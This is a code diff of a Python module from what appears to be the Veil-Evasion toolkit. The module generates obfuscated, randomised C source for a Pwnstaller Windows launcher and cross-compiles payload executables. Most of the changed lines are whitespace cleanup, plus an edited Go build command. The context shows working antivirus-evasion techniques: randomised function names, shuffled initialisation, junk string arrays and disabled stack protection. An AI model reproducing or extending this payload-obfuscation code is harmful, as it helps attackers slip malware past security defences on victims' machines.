@@ -168,7 +168,7 @@ def supportingFiles(payload, payloadFile, options):
     elif language.lower() == "go":
         exeName = ".".join(payloadFile.split("/")[-1].split(".")[:-1]) + ".exe"
 
-        os.system('env CGO_ENABLED=1 GOOS=windows GOARCH=386 CC=\"i686-w64-mingw32-gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -lssp\" go build -ldflags -H=windowsgui -o ' + settings.PAYLOAD_COMPILED_PATH + exeName + ' ' + payloadFile)
+        os.system('env GOROOT=/usr/src/go CGO_ENABLED=1 GOOS=windows GOARCH=386 CC=\"i686-w64-mingw32-gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -lssp\" /usr/src/go/bin/go build -ldflags -H=windowsgui -o ' + settings.PAYLOAD_COMPILED_PATH + exeName + ' ' + payloadFile)
 
         messages.title()
         print "\n [*] Executable written to: " +  helpers.color(settings.PAYLOAD_COMPILED_PATH + exeName)
@@ -205,7 +205,7 @@ def compileToTemp(language, payloadSource):
 #
 #################################################################
 
-def pwnstallerGenerateUtils(): 
+def pwnstallerGenerateUtils():
     """
     Generates an obfuscated version of Pwnstaller's utils.c
     """
@@ -268,7 +268,7 @@ def pwnstallerGenerateUtils():
     code += "%s = (void*)GetProcAddress(%s, \"%s\");\n" %(ReleaseActCtxName, k32Name, ReleaseActCtxName)
     code += "%s = (void*)GetProcAddress(%s, \"%s\");\n" %(DeactivateActCtxName, k32Name, DeactivateActCtxName)
     code += "if (!%s || !%s) { return; }}\n" %(ReleaseActCtxName, DeactivateActCtxName)
-    
+
 
     # init_launcher()
     code += "void init_launcher(void) { InitCommonControls(); }\n"
@@ -324,12 +324,12 @@ def pwnstallerGenerateUtils():
     code += "int %s = 0;\n" %(rcName)
 
     # a set of lines whose order can be randomized safely
-    lineSet1 = ["signal(SIGABRT, SIG_IGN);", 
-                "signal(SIGINT, SIG_IGN);" , 
-                "signal(SIGTERM, SIG_IGN);", 
-                "signal(SIGBREAK, SIG_IGN);", 
-                "%s.nLength = sizeof(%s);" %(saName,saName), 
-                "%s.lpSecurityDescriptor = NULL;" %(saName), 
+    lineSet1 = ["signal(SIGABRT, SIG_IGN);",
+                "signal(SIGINT, SIG_IGN);" ,
+                "signal(SIGTERM, SIG_IGN);",
+                "signal(SIGBREAK, SIG_IGN);",
+                "%s.nLength = sizeof(%s);" %(saName,saName),
+                "%s.lpSecurityDescriptor = NULL;" %(saName),
                 "%s.bInheritHandle = TRUE;" %(saName)]
     random.shuffle(lineSet1)
     code += "\n".join(lineSet1) + "\n"
@@ -338,13 +338,13 @@ def pwnstallerGenerateUtils():
 
     # another set of lines whose order can be randomized safely
     lineSet2 = [
-        "%s.lpReserved = NULL;" %(siName), 
-        "%s.lpDesktop = NULL;" %(siName), 
-        "%s.lpTitle = NULL;" %(siName), 
-        "%s.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;" %(siName), 
-        "%s.wShowWindow = SW_NORMAL;" %(siName), 
-        "%s.hStdInput = (void*)_get_osfhandle(fileno(stdin));" %(siName), 
-        "%s.hStdOutput = (void*)_get_osfhandle(fileno(stdout));" %(siName), 
+        "%s.lpReserved = NULL;" %(siName),
+        "%s.lpDesktop = NULL;" %(siName),
+        "%s.lpTitle = NULL;" %(siName),
+        "%s.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;" %(siName),
+        "%s.wShowWindow = SW_NORMAL;" %(siName),
+        "%s.hStdInput = (void*)_get_osfhandle(fileno(stdin));" %(siName),
+        "%s.hStdOutput = (void*)_get_osfhandle(fileno(stdout));" %(siName),
         "%s.hStdError = (void*)_get_osfhandle(fileno(stderr));" %(siName)]
     random.shuffle(lineSet2)
     code += "\n".join(lineSet2) + "\n"
@@ -373,7 +373,7 @@ def pwnstallerGenerateUtilsH(methodSubs):
     code += "int set_environment(const ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
     code += "int spawn(LPWSTR %s);\n" %(helpers.randomString())
 
-    
+
     # replace all method names with their randomized choices from the passed list
     for m in methodSubs: code = code.replace(m[0], m[1])
 
@@ -385,7 +385,7 @@ def pwnstallerGenerateMain():
     Generate an obfuscated version of Pwnstaller's main.c
     """
     allincludes = "#include \"utils.h\"\n"
-    
+
     # TODO: implement call-chain obfuscation here and in launch.c
 
     status_listName = helpers.randomString()
@@ -402,14 +402,14 @@ def pwnstallerGenerateMain():
     global_max_string_length = 10000
     max_string_length = random.randint(100,global_max_string_length)
     max_num_strings = 10000
-    
+
     # TODO: add in more string processing functions
     randName1 = helpers.randomString() # reverse()
     randName2 = helpers.randomString() # doubles characters
-    stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)), 
+    stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)),
                             (randName2, "char* %s(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\\0'; return result; }" %(randName2))
                          ]
-                        
+
     random.shuffle(stringModFunctions)
 
     # obfuscation "logical nop" string generation functions
@@ -447,7 +447,7 @@ def pwnstallerGenerateMain():
     code += stringGenFunctions[2][1] + "\n"
 
     code += "int APIENTRY WinMain( HINSTANCE %s, HINSTANCE %s, LPSTR %s, int %s ) {\n" % (helpers.randomString(), helpers.randomString(), helpers.randomString(), helpers.randomString(), )
-    
+
     # all of these initialization ran be randomized in order
     # TODO: obfuscate the MEIPASS string?
     initializations = [ "ARCHIVE_STATUS *%s[20];" %(status_listName),
@@ -471,7 +471,7 @@ def pwnstallerGenerateMain():
     code += "memset(&%s, 0, 20 * sizeof(ARCHIVE_STATUS *));\n" %(status_listName)
 
     # malloc our first string obfuscation array
-    code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_1, char_array_name_1, random.randint(max_string_length,global_max_string_length)) 
+    code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_1, char_array_name_1, random.randint(max_string_length,global_max_string_length))
 
     code += "if ((%s[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }\n" %(status_listName)
     code += "get_thisfile(%s, argv[0]);\n" %(thisfileName)
@@ -479,13 +479,13 @@ def pwnstallerGenerateMain():
 
     # malloc our second string obfuscation array
     code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_2, char_array_name_2, random.randint(max_string_length,global_max_string_length))
-    
+
     code += "get_archivefile(%s, %s);\n" %(archivefileName, thisfileName)
     code += "get_homepath(%s, %s);\n" %(homepathName, thisfileName)
 
     # malloc our third string obfuscation array
     code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_3, char_array_name_3, random.randint(max_string_length,global_max_string_length))
-        
+
     # TODO: obfuscate this string?
     code += "%s = getenv( \"_MEIPASS2\" );\n" %(extractionpathName)
     code += "if (%s && *%s == 0) { %s = NULL; }\n" %(extractionpathName,extractionpathName,extractionpathName)
@@ -502,7 +502,7 @@ def pwnstallerGenerateMain():
     code += "        strcpy(%s[SELF]->temppath, %s);\n" %(status_listName, extractionpathName)
     code += "        strcpy(%s[SELF]->temppathraw, %s); }\n" %(status_listName, extractionpathName)
     code += "    CreateActContext(%s, %s);\n" %(extractionpathName, thisfileName)
-    
+
     # first string obfuscation method
     code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_1, char_array_name_1, stringGenFunctions[0][0])
 
@@ -512,7 +512,7 @@ def pwnstallerGenerateMain():
     code += "} else { \n"
 
     code += "    if (extractBinaries(%s)) { return -1; }\n" %(status_listName)
-    
+
     # second string obfuscation method
     code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_2, char_array_name_2, stringGenFunctions[1][0])
 
@@ -522,10 +522,10 @@ def pwnstallerGenerateMain():
     code += "    %s = spawn(%s);\n" %(rcName, thisfilewName)
     code += "    if (%s[SELF]->temppath[0] != 0) clear(%s[SELF]->temppath);\n" %(status_listName,status_listName)
     code += "    for (i = SELF; %s[i] != NULL; i++) { free(%s[i]); }}\n" %(status_listName, status_listName)
-    
+
     # third string obfuscation method
     code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_3, char_array_name_3, stringGenFunctions[2][0])
-        
+
     code += "return %s; }\n" %(rcName)
 
     return (allincludes, code)
@@ -536,8 +536,8 @@ def pwnstallerGenerateLaunch():
     """
     Generate obfuscated versions of Pwnstaller's launch.c and launch.h
 
-    This is the tough one- ~1600 original lines, trimmed down to a more 
-    manageable and necessary ~500 
+    This is the tough one- ~1600 original lines, trimmed down to a more
+    manageable and necessary ~500
     """
     allincludes = ""
 
@@ -1068,7 +1068,7 @@ def pwnstallerGenerateLaunch():
     code += "        strcpy(%s, %s->name); strcat(%s, \".py\");\n" %(bufName, ptocName, bufName)
     code += "        __file__ = PI_PyString_FromStringAndSize(%s, strlen(%s));\n" %(bufName, bufName)
     code += "        PI_PyObject_SetAttrString(__main__, \"__file__\", __file__); Py_DECREF(__file__);\n"
-    code += "        %s = PI_PyRun_SimpleString(%s);\n" %(rcName, dataName) 
+    code += "        %s = PI_PyRun_SimpleString(%s);\n" %(rcName, dataName)
     code += "        if (%s != 0) return %s; free(%s); }\n" %(rcName, rcName, dataName)
     code += "    %s = incrementTocPtr(%s, %s);\n" %(ptocName, statusName, ptocName)
     code += "} return 0; }\n"
@@ -1275,16 +1275,16 @@ def pwnstallerBuildSource():
     Build all the obfuscated Pwnstaller source files.
     """
     # all methods in util.c paired with a randomized name to substitute in
-    util_methods = [    ('basename(',helpers.randomString()+"("), 
-                        ('IsXPOrLater(',helpers.randomString()+"("), 
-                        ('CreateActContext(',helpers.randomString()+"("), 
-                        ('ReleaseActContext(',helpers.randomString()+"("), 
-                        ('init_launcher(',helpers.randomString()+"("), 
-                        ('get_thisfile(',helpers.randomString()+"("), 
-                        ('get_thisfilew(',helpers.randomString()+"("), 
-                        ('get_homepath(',helpers.randomString()+"("), 
-                        ('get_archivefile(',helpers.randomString()+"("), 
-                        ('set_environment(',helpers.randomString()+"("), 
+    util_methods = [    ('basename(',helpers.randomString()+"("),
+                        ('IsXPOrLater(',helpers.randomString()+"("),
+                        ('CreateActContext(',helpers.randomString()+"("),
+                        ('ReleaseActContext(',helpers.randomString()+"("),
+                        ('init_launcher(',helpers.randomString()+"("),
+                        ('get_thisfile(',helpers.randomString()+"("),
+                        ('get_thisfilew(',helpers.randomString()+"("),
+                        ('get_homepath(',helpers.randomString()+"("),
+                        ('get_archivefile(',helpers.randomString()+"("),
+                        ('set_environment(',helpers.randomString()+"("),
                         ('spawn(',helpers.randomString()+"(")]
 
 
@@ -1302,7 +1302,7 @@ def pwnstallerBuildSource():
                         ("importModules(", helpers.randomString()+"("),
                         ("installZlib(", helpers.randomString()+"("),
                         ("installZlibs(", helpers.randomString()+"("),
-                        ("decompress(", helpers.randomString()+"("), 
+                        ("decompress(", helpers.randomString()+"("),
                         ("extract(", helpers.randomString()+"("),
                         ("openTarget(", helpers.randomString()+"("),
                         ("createTempPath(", helpers.randomString()+"("),
@@ -1384,7 +1384,7 @@ def pwnstallerBuildSource():
 def pwnstallerCompileRunw():
     """
     Executes all the mingw32 commands needed to compile the new Pwnstaller Pwnstaller runw.exe
-    """    
+    """
     libraries = []
 
     # "fake" libraries to include with compilation
@@ -1415,7 +1415,7 @@ def generatePwnstaller():
     os.system('clear')
 
     print "========================================================================="
-    print " Pwnstaller | [Version]: %s" %(PWNSTALLER_VERSION) 
+    print " Pwnstaller | [Version]: %s" %(PWNSTALLER_VERSION)
     print "========================================================================="
     print " [Web]: http://harmj0y.net/ | [Twitter]: @harmj0y"
     print "========================================================================="
